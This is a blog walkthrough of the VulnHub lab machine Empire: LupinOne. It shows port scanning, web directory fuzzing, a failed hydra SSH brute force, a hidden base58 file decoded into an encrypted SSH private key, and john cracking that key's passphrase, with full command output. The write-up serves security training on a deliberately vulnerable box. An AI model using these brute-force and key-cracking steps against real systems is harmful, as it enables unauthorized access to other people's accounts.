<meta charset="UTF-8">
<link rel="stylesheet" href="../../../index.css"/>
<link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
<script src="../../../highlight/highlight.min.js"></script>
<script>hljs.highlightAll();</script>

<h1>/f0c1s/blog/sec/vulnhub/Empire: LupinOne</h1>

<p>
    <a href="../../../index.html">/blog</a>
    <a href="../../index.html">Security</a>
    <a href="../index.html">VulnHub</a>
    <a href="../../../sec/vulnhub/empire-lupin-one/empire-lupin-one.html">+ Empire: LupinOne - 2021.12.18 Saturday</a>
</p>

<h1 id="empire-lupin-one">Empire: Lupin One</h1>
<p><a href="https://www.vulnhub.com/entry/empire-lupinone,750/">VulnHub</a>, part of series <a href="https://www.vulnhub.com/series/empire,507/">Empire</a>.</p>
<blockquote>
<p>Difficulty: Medium</p>
<p>This box was created to be medium, but it can be hard if you get lost.</p>
<p>CTF like box. You have to enumerate as much as you can.</p>
<p>For hints discord Server ( https://discord.gg/7asvAhCEhe )</p>
</blockquote>
<p>Note: I had to disable the existing network connection and open a new one to get host-only adapter working.</p>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Saturday 18 December 2021 11:58:16 AM IST 2021.12.18 11:58:16
f0c1s@kali:~/vuln-hubs/empire/lupin-one $
fping -aAqg 192.168.56.1/24 | tee fping.txt
192.168.56.1
192.168.56.2
192.168.56.70
192.168.56.73
                                                                                                                                                                                                                                           


hostname -I: 192.168.42.7 192.168.56.70 
Saturday 18 December 2021 11:59:26 AM IST 2021.12.18 11:59:26
f0c1s@kali:~/vuln-hubs/empire/lupin-one $
export RHOST=&quot;192.168.56.73&quot;
export LHOST=&quot;192.168.56.70&quot;
export LPORT=&quot;443&quot;
                                                                                                                                                                                                                                           


hostname -I: 192.168.42.7 192.168.56.70 
Saturday 18 December 2021 11:59:35 AM IST 2021.12.18 11:59:35
f0c1s@kali:~/vuln-hubs/empire/lupin-one $
_n $RHOST  
firing nmap 192.168.56.73 | tee nmap.default.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-18 11:59 IST
Nmap scan report for 192.168.56.73
Host is up (0.00021s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
                                                                                                                                                                                                                                           


hostname -I: 192.168.42.7 192.168.56.70 
Saturday 18 December 2021 11:59:42 AM IST 2021.12.18 11:59:42
f0c1s@kali:~/vuln-hubs/empire/lupin-one $
_ntd $RHOST
firing nmap 192.168.56.73 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-18 11:59 IST
Nmap scan report for 192.168.56.73
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)
|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)
|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/~myfiles
|_http-title: Site doesn&#39;t have a title (text/html).
|_http-server-header: Apache/2.4.48 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds</code></pre>
<figure>
<img src="1.fping-and-nmap-default.png" alt="" /><figcaption>1.fping-and-nmap-default</figcaption>
</figure>
<figure>
<img src="2.nmap-tcp-ports.png" alt="" /><figcaption>2.nmap-tcp-ports</figcaption>
</figure>
<pre class="shell"><code>curl -s http://$RHOST/robots.txt | html2text | tee curl.html2text.robots.txt
User-agent: * Disallow: /~myfiles
                                                                                                                                                                                                                                           
curl -s http://$RHOST | html2text | grep -v &quot;^$&quot; | tee curl.html2text.txt   
[/image/arsene_lupin.jpg]

wget -q http://192.168.56.73/image/arsene_lupin.jpg

exiftool arsene_lupin.jpg 
ExifTool Version Number         : 12.36
File Name                       : arsene_lupin.jpg
Directory                       : .
File Size                       : 129 KiB
File Modification Date/Time     : 2021:02:13 14:47:10+05:30
File Access Date/Time           : 2021:12:18 12:04:03+05:30
File Inode Change Date/Time     : 2021:12:18 12:04:03+05:30
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 630
Image Height                    : 630
Bit Depth                       : 16
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 630x630
Megapixels                      : 0.397</code></pre>
<figure>
<img src="3.curl-robots-get-image-exiftool.png" alt="" /><figcaption>3.curl-robots-get-image-exiftool</figcaption>
</figure>
<figure>
<img src="4.web-page.png" alt="" /><figcaption>4.web-page</figcaption>
</figure>
<pre class="shell"><code>gobuster dir --url http://$RHOST --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -q | grep -vi &quot;Status: 403&quot;
/image                (Status: 301) [Size: 314] [--&gt; http://192.168.56.73/image/]
/javascript           (Status: 301) [Size: 319] [--&gt; http://192.168.56.73/javascript/]
/.                    (Status: 200) [Size: 333]                                       
/manual               (Status: 301) [Size: 315] [--&gt; http://192.168.56.73/manual/]</code></pre>
<figure>
<img src="5.slash-image.png" alt="" /><figcaption>5.slash-image</figcaption>
</figure>
<figure>
<img src="6.slash-javascript.png" alt="" /><figcaption>6.slash-javascript</figcaption>
</figure>
<figure>
<img src="7.slash-manual.png" alt="" /><figcaption>7.slash-manual</figcaption>
</figure>
<figure>
<img src="8.gobuster-output.png" alt="" /><figcaption>8.gobuster-output</figcaption>
</figure>
<figure>
<img src="9.myfiles-is-a-dud.png" alt="" /><figcaption>9.myfiles-is-a-dud</figcaption>
</figure>
<figure>
<img src="10.feroxbuster-cannot-help.png" alt="" /><figcaption>10.feroxbuster-cannot-help</figcaption>
</figure>
<h2 id="found-secret">Found <code>~secret</code></h2>
<pre class="shell"><code>ffuf -s -u http://$RHOST/~FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
secret
myfiles</code></pre>
<figure>
<img src="11.ffuf-finds-secret.png" alt="" /><figcaption>11.ffuf-finds-secret</figcaption>
</figure>
<figure>
<img src="12.slash-tilde-secret.png" alt="" /><figcaption>12.slash-tilde-secret</figcaption>
</figure>
<p>Well at this point I tried <code>http://192.168.56.73/~secret/.ssh/id_rsa</code>; as this seems obviously the first step. But fails.</p>
<p>And so does gobuster, it cannot find anything.</p>
<pre class="shell"><code>gobuster dir --url http://$RHOST/~secret/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -q | grep -vi &quot;Status: 403&quot;
/.                    (Status: 200) [Size: 331]</code></pre>
<div class="sourceCode" id="cb6"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="kw">&lt;br&gt;</span>Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,<span class="er">&lt;</span>/&gt; </span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="kw">&lt;br&gt;</span>Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.<span class="er">&lt;</span>/&gt; </span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="kw">&lt;br&gt;</span>I&#39;m smart I know that.<span class="er">&lt;</span>/&gt;</span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a><span class="kw">&lt;br&gt;</span>Any problem let me know<span class="er">&lt;</span>/&gt;</span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a><span class="kw">&lt;h4&gt;</span>Your best friend icex64<span class="er">&lt;</span>/&gt;</span></code></pre></div>
<h2 id="these-failed">These failed</h2>
<pre class="shell"><code>ffuf -s -u http://$RHOST/~secret/.ssh/FUZZ -w /usr/share/dirsearch/db/dicc.txt -fc 403
ffuf -s -u http://$RHOST/~secret/FUZZ -w /usr/share/dirsearch/db/dicc.txt -fc 403 
ffuf -s -u http://$RHOST/~myfiles/FUZZ -w /usr/share/dirsearch/db/dicc.txt -fc 403 
ffuf -s -u http://$RHOST/~myfiles/.ssh/FUZZ -w /usr/share/dirsearch/db/dicc.txt -fc 403
ffuf -s -u http://$RHOST/~myfiles/.ssh/id_FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -fc 403
ffuf -s -u http://$RHOST/~secret/.ssh/id_FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -fc 403
ffuf -s -u http://$RHOST/~secret/.ssh/id_FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -fc 403 | grep -vi &quot;^#&quot;
ffuf -s -u http://$RHOST/~secret/FUZZ -w /usr/share/wordlists/rockyou.txt -fc 403 | grep -vi &quot;^#&quot;
ffuf -s -u http://$RHOST/~secret/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -fc 403
gobuster dir --url http://$RHOST/~secret/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -q | grep -vi &quot;Status: 403&quot; 
dirb http://$RHOST/~secret/</code></pre>
<h2 id="brute-forcing-ssh">Brute forcing SSH</h2>
<pre class="shell"><code>ssh icex64@$RHOST
The authenticity of host &#39;192.168.56.73 (192.168.56.73)&#39; can&#39;t be established.
ED25519 key fingerprint is SHA256:GZOCytQu/pnSRRTMvJLagwz7ZPlJMDiyabwLvxTrKME.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;192.168.56.73&#39; (ED25519) to the list of known hosts.
icex64@192.168.56.73&#39;s password: 


hydra -l icex64 -P /usr/share/wordlists/fasttrack.txt $RHOST ssh
Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-18 12:41:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking ssh://192.168.56.73:22/
[STATUS] 145.00 tries/min, 145 tries in 00:01h, 77 to do in 00:01h, 16 active
1 of 1 target completed, 0 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-18 12:43:24</code></pre>
<figure>
<img src="13.bruteforcing-ssh-fails.png" alt="" /><figcaption>13.bruteforcing-ssh-fails</figcaption>
</figure>
<h2 id="found-secret-1">Found secret</h2>
<pre class="shell"><code>ffuf -s -u http://$RHOST/~secret/.FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -fc 403 -e txt,pem,pub | grep -vi &quot;^#\|^$&quot;

ffuf -s -u http://$RHOST/~secret/.FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -fc 403 -e .txt,.pem,.pub | grep -vi &quot;^#\|^$&quot;
mysecret.txt</code></pre>
<figure>
<img src="14.ffuf-finds-dot-mysecret-dot-txt.png" alt="" /><figcaption>14.ffuf-finds-dot-mysecret-dot-txt</figcaption>
</figure>
<pre class="shell"><code>curl -s http://$RHOST/~secret/.mysecret.txt | html2text | grep -v &quot;^$&quot; | tee curl.html2text.mysecret.txt
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</code></pre>
<figure>
<img src="15.mysecret.png" alt="" /><figcaption>15.mysecret</figcaption>
</figure>
<blockquote>
<p><code>hashid</code> says unknown hash. This file feels like that it should be a private key file. But it is not.</p>
</blockquote>
<h2 id="httpswww.dcode.frcipher-identifier-for-the-rescue"><code>https://www.dcode.fr/cipher-identifier</code> for the rescue</h2>
<figure>
<img src="16.dcode-fr-finds-base-58.png" alt="" /><figcaption>16.dcode-fr-finds-base-58</figcaption>
</figure>
<p><code>https://www.dcode.fr/base-58-cipher</code></p>
<figure>
<img src="17.decoded-private-key.png" alt="" /><figcaption>17.decoded-private-key</figcaption>
</figure>
<pre class="shell"><code>cat sshKey         
-----BEGIN OPENSSH PRIVATE KEY-----
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
iUJ66WmRUN9EoVlkeCzQJwivI=
-----END OPENSSH PRIVATE KEY-----</code></pre>
<figure>
<img src="18.sshKey.png" alt="" /><figcaption>18.sshKey</figcaption>
</figure>
<figure>
<img src="19.cannot-use-directly-need-to-crack-password.png" alt="" /><figcaption>19.cannot-use-directly-need-to-crack-password</figcaption>
</figure>
<figure>
<img src="20.tocrack-via-ssh2john.png" alt="" /><figcaption>20.tocrack-via-ssh2john</figcaption>
</figure>
<h2 id="cracking-ssh-key-password">Cracking ssh key password</h2>
<h3 id="these-failed-1">These failed</h3>
<pre class="shell"><code>john tocrack.txt
john tocrack.txt -W /usr/share/wordlists/fasttrack.txt
john tocrack.txt -w /usr/share/wordlists/fasttrack.txt
john tocrack.txt -wordlist /usr/share/wordlists/fasttrack.txt
john tocrack.txt --wordlist /usr/share/wordlists/fasttrack.txt
john tocrack.txt /usr/share/wordlists/fasttrack.txt</code></pre>
<h3 id="success">Success!</h3>
<pre class="shell"><code>john tocrack.txt --wordlist=/usr/share/wordlists/fasttrack.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
P@55w0rd!        (sshKey)     
1g 0:00:00:02 DONE (2021-12-18 13:41) 0.4201g/s 20.16p/s 20.16c/s 20.16C/s Winter2015..Welcome1212
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed.</code></pre>
<figure>
<img src="21.cracked-ssh-password.png" alt="" /><figcaption>21.cracked-ssh-password</figcaption>
</figure>
<h2 id="ssh-login">SSH login</h2>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Saturday 18 December 2021 01:42:48 PM IST 2021.12.18 13:42:48
f0c1s@kali:~/vuln-hubs/empire/lupin-one $
